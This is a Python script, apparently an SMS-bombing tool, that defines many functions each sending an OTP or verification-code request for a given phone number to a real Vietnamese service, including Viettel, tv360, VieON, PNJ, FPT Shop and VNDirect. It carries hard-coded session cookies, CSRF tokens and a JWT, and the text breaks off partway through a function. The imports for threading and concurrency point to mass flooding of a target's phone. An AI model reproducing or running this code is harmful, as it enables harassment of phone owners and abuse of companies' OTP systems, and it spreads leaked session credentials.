import requests
import concurrent.futures
import time
import json
import random
import string
import threading
import sys
from threading import BoundedSemaphore
def tv360(phone):
    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'session-id': 's%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM',
        'device-id': 's%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg',
        'shared-device-id': 'web_89c04dba-075e-49fe-b218-e33aef99dd12',
        'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; session-id=s%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM; device-id=s%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg; shared-device-id=web_89c04dba-075e-49fe-b218-e33aef99dd12; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; G_ENABLED_IDPS=google',
        'dnt': '1',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1722324791163',
        'tz': 'Asia/Bangkok',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
def myvt(phone):
    cookies = {
        'laravel_session': 'ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf',
        'redirectLogin': 'https://viettel.vn/myviettel',
        'XSRF-TOKEN': 'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/myviettel',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-CSRF-TOKEN': 'H32gw4ZAkTzoN8PdQkH3yJnn2wvupVCPCGx4OC4K',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ==',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'typeCode': 'DI_DONG',
        'actionCode': 'myviettel://login_mobile',
        'type': 'otp_login',
    }

    response = requests.post('https://viettel.vn/api/getOTPLoginCommon', cookies=cookies, headers=headers, json=json_data)
def vieon(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjI1MTA3NDksImp0aSI6IjQ3OGJkODI1MmY2ODdkOTExNzdlNmJhM2MzNTE5ZDNkIiwiYXVkIjoiIiwiaWF0IjoxNzIyMzM3OTQ5LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMjMzNzk0OCwic3ViIjoiYW5vbnltb3VzX2Y4MTJhNTVkMWQ1ZWUyYjg3YTkyNzgzM2RmMjYwOGJjLTRmNzQyY2QxOTE4NjcwYzIzODNjZmQ3ZGRiNjJmNTQ2LTE3MjIzMzc5NDkiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiZjgxMmE1NWQxZDVlZTJiODdhOTI3ODMzZGYyNjA4YmMtNGY3NDJjZDE5MTg2NzBjMjM4M2NmZDdkZGI2MmY1NDYtMTcyMjMzNzk0OSIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjcuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.RwOGV_SA9U6aMo84a1bxwRjLbxdDLB-Szg7w_riYKAA',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': phone,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': 'f812a55d1d5ee2b87a927833df2608bc',
        'device_name': 'Edge/127',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
def goldenspoon(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'cache-control': 'max-age=0',
        'content-type': 'application/json',
        'origin': 'https://gogi.com.vn',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    json_data = {
        'phoneNumber': phone,
        'provider': 1,
        'type': 1,
        'language': 1,
    }

    response = requests.post('https://external.ggg.systems/request-otp', headers=headers, json=json_data)
def goldenspoon1(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'cache-control': 'max-age=0',
        'content-type': 'application/json',
        'origin': 'https://gogi.com.vn',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    json_data = {
        'phoneNumber': phone,
        'provider': 2,
        'type': 1,
        'language': 1,
    }

    response = requests.post('https://external.ggg.systems/request-otp', headers=headers, json=json_data)
def fahasha(phone):
    cookies = {
        '_gcl_au': '1.1.1582095510.1734689637',
        '_ga': 'GA1.1.777159052.1734689637',
        '_tt_enable_cookie': '1',
        '_ttp': 'RfytCvP4Dbb5Rkn8quQ3XHBsC75.tt.1',
        'USER_DATA': '%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2203177807-114f-43bc-af5c-9c598599ff42%22%2C%22deviceAdded%22%3Atrue%7D',
        'SOFT_ASK_STATUS': '%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
        'OPT_IN_SHOWN_TIME': '1734777462938',
        'frontend': '68b75258c880488086ca36d03ee52c3c',
        '_ga_D3YYPWQ9LN': 'GS1.1.1737336219.6.0.1737336219.0.0.0',
        '_clck': 'tc828v%7C2%7Cfsq%7C0%7C1815',
        'moe_uuid': '03177807-114f-43bc-af5c-9c598599ff42',
        'SESSION': '%7B%22sessionKey%22%3A%22f41ba2ee-e35d-429c-a3e7-749ec463b3da%22%2C%22sessionStartTime%22%3A%222025-01-20T01%3A23%3A43.906Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1737338023921%2C%22numberOfSessions%22%3A9%7D',
        '_clsk': '1d92taw%7C1737336224339%7C1%7C1%7Cq.clarity.ms%2Fcollect',
        '_ga_460L9JMC2G': 'GS1.1.1737336219.6.0.1737336226.53.0.390677539',
        'HARD_ASK_STATUS': '%7B%22actualValue%22%3A%22denied%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.1582095510.1734689637; _ga=GA1.1.777159052.1734689637; _tt_enable_cookie=1; _ttp=RfytCvP4Dbb5Rkn8quQ3XHBsC75.tt.1; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2203177807-114f-43bc-af5c-9c598599ff42%22%2C%22deviceAdded%22%3Atrue%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; OPT_IN_SHOWN_TIME=1734777462938; frontend=68b75258c880488086ca36d03ee52c3c; _ga_D3YYPWQ9LN=GS1.1.1737336219.6.0.1737336219.0.0.0; _clck=tc828v%7C2%7Cfsq%7C0%7C1815; moe_uuid=03177807-114f-43bc-af5c-9c598599ff42; SESSION=%7B%22sessionKey%22%3A%22f41ba2ee-e35d-429c-a3e7-749ec463b3da%22%2C%22sessionStartTime%22%3A%222025-01-20T01%3A23%3A43.906Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1737338023921%2C%22numberOfSessions%22%3A9%7D; _clsk=1d92taw%7C1737336224339%7C1%7C1%7Cq.clarity.ms%2Fcollect; _ga_460L9JMC2G=GS1.1.1737336219.6.0.1737336226.53.0.390677539; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22denied%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
        'origin': 'https://www.fahasa.com',
        'priority': 'u=1, i',
        'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-dae3d3ef998247f11621c4752beac4b4-50cf0e547fb0f9cb-01',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
    }

    response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
def PNJ(phone):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': '_cdp_user_new; _gcl_au=1.1.1539180309.1734704886; au_id=1711837792; _asm_uid=1711837792; _ac_au_gt=1734704885956; CDPI_VISITOR_ID=cfdb810a-112d-4508-bdf5-328e94772429; _tt_enable_cookie=1; _ttp=FgcRd1T1_6lz67t0qurGtPCWP60.tt.2; CDPI_RETURN=Return; _utm_objs=eyJzb3VyY2UiOiJjaXR5YWRzIiwibWVkaXVtIjoiY3BhIiwiY2FtcGFpZ24iOiJrNTRnR0UiLCJj%0D%0Ab250ZW50IjoiIiwidGVybSI6IiIsInR5cGUiOiJkaXJlY3QiLCJ0aW1lIjoxNzM0NzA1MDYwOTcw%0D%0ALCJjaGVja3N1bSI6IioifQ%3D%3D; _atm_objs=eyJzb3VyY2UiOiJpbWMtZy1jb2MtY29jLXNlYXJjaCIsIm1lZGl1bSI6ImNwYyIsImNhbXBhaWdu%0D%0AIjoiQXdvLVE0IiwiY29udGVudCI6IjQ0ODcxOTQwIiwidGVybSI6Im5oJUUxJUJBJUFCbiUyMGMl%0D%0ARTElQkElQTd1JTIwaCVDMyVCNG4iLCJ0eXBlIjoiYXNzb2NpYXRlX3V0bSIsImNoZWNrc3VtIjoi%0D%0AKiIsInRpbWUiOjE3MzQ4MzgyMTIxNTN9; _pk_ref.564990245.4a15=%5B%22Awo-Q4%22%2C%22nh%E1%BA%ABn%20c%E1%BA%A7u%20h%C3%B4n%22%2C1734838212%2C%22https%3A%2F%2Fcontext.qc.coccoc.com%2F%22%5D; _pk_ses.564990245.4a15=*; utm_notifications=%7B%22utm_source%22%3A%22imc-g-coc-coc-search%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_content%22%3A%2244871940%22%2C%22utm_campaign%22%3A%22Awo-Q4%22%2C%22aff_sid%22%3A%22%22%7D; CDPI_SESSION_ID=89233897-fae2-4cd7-9255-dd3342921ede; _asm_visitor_type=r; _cdp_cfg=1; cdp_session=1; _gid=GA1.3.968284004.1734838216; _gat_UA-26000195-1=1; _clck=1gqcnrc%7C2%7Cfrx%7C0%7C1815; recently_products=null; _ga_K1CDGBJEK0=GS1.1.1734838215.2.0.1734838229.0.0.0; _asm_ss_view=%7B%22time%22%3A1734838214172%2C%22sid%22%3A%225683956380156401%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-12-22T03%3A30%3A30%22%2C%22duration%22%3A16228%7D; _clsk=1x6x9aw%7C1734838230898%7C2%7C1%7Cq.clarity.ms%2Fcollect; _pk_id.564990245.4a15=1711837792.1734704886.2.1734838231.1734838212.; _ac_client_id=1711837792.1734838232; _ac_an_session=zmzlzrzgzqzmzlzgzrzjzizmzlznzjzizdzizkzizizrzgzkzkzqzhzdzizkzgznzrzgzrzhzgzhzdzizdzizkzgznzrzgzrzhzgzhzdzizkzgznzrzgzrzhzgzhzdzizdzlzizdzizd2f27zdzgzdzlzmzkzjzlzdzd3cz62qznz62szq2725z83626271x; _ga_3S12QVTD78=GS1.1.1734838213.2.1.1734838231.42.0.0; _ga=GA1.3.587610544.1734704887; _ga_TN4J88TP5X=GS1.3.1734838216.2.1.1734838231.45.0.0; XSRF-TOKEN=eyJpdiI6IjNNclE5UTNuamx1ZkJ1YlE0QzdxRGc9PSIsInZhbHVlIjoieEFSU1VYNStlY1FVWGJ2SkxLU0Y0ajJja2Z5M1oyVDhjL3YvREdVc1FyVVRidVdKaXhtTS9NR3ZSNldtL0l2Qi9tbFl5ckpMbWV0STBpODd4OFFJUnhLSGhaVHJDbWpEVEJRY3doWGVjUDlncThjUGVSS0pSMjJVVG1Ea3VVYkoiLCJtYWMiOiIzZDU2YTY1YmVlMmJiZGNkYzQwZDZlOWFlNGM1MmM5YTI5NGE5YmE5MjQ1N2E2NTg5M2E2YTAyYTgyNDk1YmQ2IiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IjNORDNqYWNqejl5WmtXakdpdkltbXc9PSIsInZhbHVlIjoiYXUxK3NaQXhhcmJabkdyRXR1TWR2VVJxWTBnYUxPN1o2M2I3VmEvcS96STlYUjloanNBb2krUkpJS2E3bHl5Q3JxS3hyL04zNW5rSnhyT2xBbnd6Wm5oTmcvMWsrTFNNcHNhdVdHTEJ2b0ZGL3hkNjZoQkpHMitzS21GRWV0R08iLCJtYWMiOiIzMzVmNDcwY2UxYmIyNGE2M2JjMmJlZTIwOTM0NzQ2YjdjOTE3M2QwOWM0ZWZlYmUwNThjY2M0NmQ4ODJmYzAxIiwidGFnIjoiIn0%3D; _ga_FR6G8QLYZ1=GS1.1.1734838213.2.1.1734838238.0.0.0',
        'origin': 'https://www.pnj.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.pnj.com.vn/customer/login',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    data = {
        '_method': 'POST',
        '_token': 'Ep2Eu31PveWUdQdZk0Jkk0OKtve59Dj87iEe2Egv',
        'type': 'sms',
        'phone': phone,
    }

    response = requests.post('https://www.pnj.com.vn/customer/otp/request', headers=headers, data=data)
def PNJ1(phone):
    cookies = {
        'CDPI_VISITOR_ID': '78166678-ea1e-47ae-9e12-145c5a5fafc4',
        'CDPI_RETURN': 'New',
        'CDPI_SESSION_ID': 'f3a5c6c7-2ef6-4d19-a792-5e3c0410677f',
        'XSRF-TOKEN': 'eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D',
        'mypnj_session': 'eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'CDPI_VISITOR_ID=78166678-ea1e-47ae-9e12-145c5a5fafc4; CDPI_RETURN=New; CDPI_SESSION_ID=f3a5c6c7-2ef6-4d19-a792-5e3c0410677f; XSRF-TOKEN=eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
        'dnt': '1',
        'origin': 'https://www.pnj.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.pnj.com.vn/customer/login',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        '_method': 'POST',
        '_token': '0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU',
        'type': 'zns',
        'phone': phone,
    }

    response = requests.post('https://www.pnj.com.vn/customer/otp/request', cookies=cookies, headers=headers, data=data)
def fptshop(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://fptshop.com.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://fptshop.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': phone,
    }

    response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
def bestex(phone):
    headers = {
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'Connection': 'keep-alive',
        'Origin': 'https://www.best-inc.vn',
        'Referer': 'https://www.best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    params = {
        'code': '0d3f727eefa2b169990f646a9649c11c',
        'instanceId': '80dc5344-18e2-4436-bb57-6ab5f4407450',
        'validate': 'd0efe1958f09de4e2de7508046ad935b',
    }

    json_data = {
        'phoneNumber': phone,
        'verificationCodeType': 1,
    }

    response = requests.post('https://v9-cc.800best.com/uc/account/sendSignUpCode', params=params, headers=headers, json=json_data)
def vndirect(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'Connection': 'keep-alive',
        'Origin': 'https://mydgo.vndirect.com.vn',
        'Referer': 'https://mydgo.vndirect.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'template': 'sms_otp_trading_vi',
        'send': phone,
        'type': 'PHONE',
    }

    response = requests.get('https://id.vndirect.com.vn/authentication/otp/', params=params, headers=headers)
def mocha(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
    }

    params = {
        'msisdn': phone,
        'languageCode': 'vi',
    }

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
def vuihoc(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ja',
        'app-id': '2',
        'authorization': 'Bearer',
        'content-type': 'application/json',
        'origin': 'https://vuihoc.vn',
        'priority': 'u=1, i',
        'referer': 'https://vuihoc.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'send-from': 'WEB',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    json_data = {
        'mobile': phone,
        'agent_type': 'web',
        'app_id': 2,
        'type': 0,
    }

    response = requests.post('https://api.vuihoc.vn/api/v2.1/send-otp', headers=headers, json=json_data)
def hasaki(phone):
    url = f"https://hasaki.vn/ajax?api=user.verifyUserName&username={phone}"
    response = requests.get(url)
def hacom(phone):
    cookies = {
